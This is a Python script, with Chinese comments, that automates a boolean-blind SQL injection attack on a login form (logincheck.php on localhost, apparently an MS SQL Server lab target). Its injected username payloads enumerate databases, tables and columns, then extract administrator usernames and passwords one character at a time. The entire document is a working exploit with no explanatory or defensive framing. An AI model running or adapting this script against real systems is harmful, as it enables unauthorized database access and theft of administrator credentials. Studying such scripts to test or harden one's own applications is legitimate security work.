from urllib.parse import quote, urlencode
import requests


def encode_url(s: str):
    uri = []
    byte_s = s.encode('utf-8')
    for e in byte_s:
        uri.append('%' + hex(e).replace('0x', '').zfill(2))
    return ''.join(uri)


base = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_/'
url = 'http://localhost/logincheck.php'

#根据dbid猜测数据库数量
database_num = 0
for l in range(1, 20):
    payload = "1' or (select count(*) from master.dbo.sysdatabases where dbid={})=1--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' not in res.url:
        database_num = l - 1
        print('database nums: ', l - 1)
        break
    print('dbid: ', l, 'exist')

#根据dbid猜测数据库长度
database_len = []
for i in range(1, database_num + 1):
    for l in range(1, 20):
        payload = "1' or (select len(name) from master.dbo.sysdatabases where dbid={})={}--".format(
            i, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            database_len.append(l)
            print('dbid ', i, ' ', 'database length: ', l)
            break

#根据dbid猜测数据库名
#猜测表名
database_name = []
for i in range(1, database_num + 1):
    d_name = ''
    for l in range(1, database_len[i - 1] + 1):
        for c in base:
            payload = "1' or ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid={}),{},1))={}--".format(
                i, l, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                d_name += c
                break
    database_name.append(d_name)
    print(d_name)

#猜测表数量
table_numbers = 0
for l in range(1, 20):
    payload = "1' or (select count(name) from sysobjects where xtype='u')={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        table_numbers = l
        print('table numbers: ', l)
        break

#猜测表长度
table_len = []
for i in range(0, table_numbers):
    for l in range(1, 20):
        payload = "1' or (select top 1 len(name) from sysobjects where  xtype='u' and name not in (select top {} name from sysobjects where xtype='u'))={}--".format(
            i, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            table_len.append(l)
            print('table length: ', l)
            break

#猜测表名
table_name = []
for i in range(0, table_numbers):
    t_name = ''
    for l in range(1, table_len[i] + 1):
        for c in base:
            payload = "1' or ascii(substring((select top 1 name from sysobjects where  xtype='u' and name not in (select top {} name from sysobjects where xtype='u')),{},1))={}--".format(
                i, l, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                t_name += c
                break
    table_name.append(t_name)
    print(t_name)

#猜测admin_users表id长度
id_len = 0
for l in range(1, 20):
    payload = "1' or (select len(id) from sysobjects where xtype='u' and name='admin_users')={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        id_len = l
        print('table id len: ', l)
        break

#猜测admin_users表的id
table_id = ''
for l in range(1, id_len + 1):
    for c in base:
        payload = "1' or ascii(substring((select top 1 str(id) from sysobjects where  xtype='u' and name = 'admin_users' ),{},1))={}--".format(
            l, ord(c))
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            table_id += c
            break
print('table id: ', table_id)

#猜测列数量
column_numbers = 0
for l in range(1, 20):
    payload = "1' or (select count(name) from syscolumns where id=1141579105)={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        column_numbers = l
        print('column numbers: ', l)
        break

# 猜测列长度
column_len = []
for i in range(0, column_numbers):
    for l in range(1, 20):
        payload = "1' or (select top 1 len(name) from syscolumns where id=1141579105 and name not in (select top {} name from syscolumns where id=1141579105))={}--".format(
            i, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            column_len.append(l)
            print('column length: ', l)
            break

#猜测列名
column_name = []
for i in range(0, column_numbers):
    c_name = ''
    for l in range(1, column_len[i] + 1):
        for c in base:
            payload = "1' or ascii(substring((select top 1 name from syscolumns where  id=1141579105 and name not in (select top {} name from syscolumns where id=1141579105)),{},1))={}--".format(
                i, l, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                c_name += c
                break
    column_name.append(c_name)
    print(c_name)

#猜测ADMIN_NAME个数
numbers = 0
for l in range(1, 20):
    payload = "1' or (select count(admin_name) from admin_users)={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_NAME每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or (select top 1 len(admin_name) from admin_users where admin_name not in (select top {} admin_name from admin_users)) ={}--".format(
            i, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_USER每项的值
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' or ascii(substring((select top 1 admin_name from admin_users where admin_name not in (select top {} admin_name from admin_users)),{},1))={}--".format(
                i, l, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                name += c
                break
    user_name.append(name)
    print('admin_user: ', name)

#猜测ADMIN_PASSWORD个数
for l in range(1, 20):
    payload = "1' or (select count(admin_password) from admin_users)={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_PASSWORD每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or (select top 1 len(admin_password) from admin_users where admin_password not in (select top {} admin_password from admin_users)) ={}--".format(
            i, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_PASSWORED每项的值
user_password = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' or ascii(substring((select top 1 admin_password from admin_users where admin_password not in (select top {} admin_password from admin_users)),{},1))={}--".format(
                i, l, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                name += c
                break
    user_password.append(name)
    print('admin_password: ', name)
